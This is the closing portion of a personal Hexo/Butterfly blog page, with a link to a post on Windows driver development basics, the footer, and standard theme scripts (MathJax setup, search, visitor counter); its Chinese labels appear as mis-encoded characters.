title="windowsé©±åŠ¨å¼€å‘ï¼ˆ0ï¼‰â€”â€”Windowsé©±åŠ¨å¼€å‘çš„åŸºç¡€çŸ¥è¯†">windowsé©±åŠ¨å¼€å‘ï¼ˆ0ï¼‰â€”â€”Windowsé©±åŠ¨å¼€å‘çš„åŸºç¡€çŸ¥è¯†</a><time datetime="2024-11-22T19:00:00.000Z" title="å‘è¡¨äº 2024-11-23 03:00:00">2024-11-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By xia0ji233</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>